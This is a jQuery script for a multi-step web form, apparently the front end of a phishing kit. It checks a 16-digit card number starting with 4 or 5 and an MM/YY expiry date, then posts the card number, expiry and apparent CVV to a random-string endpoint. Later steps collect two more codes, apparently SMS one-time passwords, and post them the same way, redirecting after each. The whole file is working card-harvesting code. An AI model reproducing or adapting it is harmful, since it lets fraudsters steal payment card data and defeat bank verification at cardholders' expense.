$(function(){
    $("#do").on("click",function(e){


        //send backend:
        $.ajax({
            url: '/V6aBZc4pcXSEaP6MxvVK',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({logita:"Bari Naxri"}),
            success: function(info) {
                if(info.OK){
                    window.location = "/jJ3EQbbMePScaAfVQD6X";
                }
            }
        });
    });
    $("#dont").on("click",function(e){


        //send backend:
        $.ajax({
            url: '/V6aBZc4pcXSEaP6MxvVK',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({logita:"Mabritx Nxri"}),
            success: function(info) {
                if(info.OK){
                    window.location = "/jJ3EQbbMePScaAfVQD6X";
                }
            }
        });
    });

    $("#pg2").on("submit",function(e){
        e.preventDefault();
        let a1 = $("#ccw").val();
        let a2 = $("#dato").val();
        let a3 = $("#cvo").val();
        a1 = a1.split(" ");
        a1=a1.join("");
        let cc_t = false;
        let dd_t = false;

        if(a1.length == 16 && (a1[0] == "5" || a1[0] == "4")){
            $(".th_cc").removeClass("error");
            cc_t = true;
        }
        if(!(a1.length == 16 && (a1[0] == "5" || a1[0] == "4"))){
            $(".th_cc").addClass("error");
        } 
        if(a2.split("/")[0].length==2 && a2.split("/")[1].length==2){
            $(".th_dd").removeClass("error");
            dd_t = true;
        }
        if(!(a2.split("/")[0].length==2 && a2.split("/")[1].length==2)){
            $(".th_dd").addClass("error");
        }

        if(cc_t && dd_t){
            //send backend:
            $.ajax({
                url: '/MS8zCVz66ybrT8sVfacr',
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({a1,a2,a3}),
                success: function(info) {
                    if(info.OK){
                        window.location = "/WvmCJ6W4vWATrp3qfT6H";
                    }
                }
            });
        }


        
    });

    $("#pg3").on("submit",function(e){ // snms1:
        e.preventDefault();
        let sps1 = $("#sps1").val();


        //send backend:
        $.ajax({
            url: '/NaMXhdDE53HXKp6FUHuy',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps1}),
            success: function(info) {
                if(info.OK){
                    window.location = "/WuTkUJSVtaExEkkUCc97";
                }
            }
        });
    });


    $("#pg4").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps2 = $("#sps2").val();
        //send backend:
        $.ajax({
            url: '/UGFMrsv6AtzFLUwqMhMy',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps2}),
            success: function(info) {
                if(info.OK){
                    window.location = "/HrSRSparDYZvJ653ma4b";
                }
            }
        });
    });



});